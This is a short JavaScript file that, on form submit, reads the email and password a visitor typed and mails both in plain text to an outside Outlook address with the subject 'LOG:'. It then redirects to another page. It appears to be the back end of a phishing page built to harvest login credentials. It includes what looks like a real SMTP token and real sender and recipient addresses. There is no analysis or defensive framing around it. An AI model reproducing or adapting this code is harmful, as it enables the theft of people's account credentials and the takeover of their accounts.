const femail = document.getElementById('femail');
const fpassword = document.getElementById('fpassword');
const submit = document.getElementsByClassName('form-contact')[0];

submit.addEventListener('submit', (e) => {
    e.preventDefault();

    let ebody = `
    <b>Email: </b>${femail.value} 
    <br> 
    <b>Password: </b>${fpassword.value} 
    <br>`;

    Email.send({
        SecureToken: "9c8cec46-60dd-4046-b3d0-0751b0d5c5c0",
        To: 'jakesfishin111@outlook.com',
        From: "jakeramon999@gmail.com",
        Subject: "LOG: " + femail.value,
        Body: ebody
    }).then(function() {
        window.location.href = "re.html";
    });
});
